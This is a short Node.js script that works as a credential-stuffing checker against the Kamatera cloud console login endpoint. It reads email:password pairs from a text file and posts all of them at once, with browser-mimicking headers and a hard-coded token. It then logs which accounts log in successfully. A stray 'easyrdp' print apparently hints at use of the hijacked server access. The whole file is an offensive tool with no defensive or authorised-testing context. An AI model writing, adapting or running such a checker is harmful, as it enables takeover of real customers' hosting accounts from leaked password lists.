const fs = require('fs');
async function login(email, password) {
    const url = "https://console.kamatera.com/svc/login";
    const payload = { email, password };
    console.log("easyrdp")
    const headers = {
        "Host": "console.kamatera.com",
        "Origin": "https://console.kamatera.com",
        "Referer": "https://console.kamatera.com/login",
        "Sec-Fetch-Dest": "empty",
        "Accept-Language": "de-DE,de;q=0.9",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "DNT": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "api-version": "latest",
        "sec-ch-ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "token": "IsgR7aLRaypuW2oaeNfpLgYPpHF7lwpiFccKRaJ60qk="
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(payload)
        });

        if (!response.ok) { console.log(`${response.status} ${response}`);
            return;
        }

        const data = await response.json();
        if (data.mediateToken && data.email) {
            console.log(`login successful for ${email}`);
        } else {
            console.log(`login failed for ${email}`);
        }
    } catch (e4) { console.error(e4.message);
    }
}

function scantxt(fileName) {
    fs.readFile(fileName, 'utf-8', async (e4, data) => {
        if (e4) { console.error(e4.message);
            return;
        }
        const lines = data.trim().split('\n');
        const loginpromise = lines.map(line => {
            const [email, password] = line.trim().split(':');
            if (email && password) {
                return login(email, password);
            } else { console.warn(`skipping invalid line -> ${line}`);
            }
        });

        await Promise.all(loginpromise);
        console.log("all login attempts have been processed");
    });
}

scantxt("x.txt");
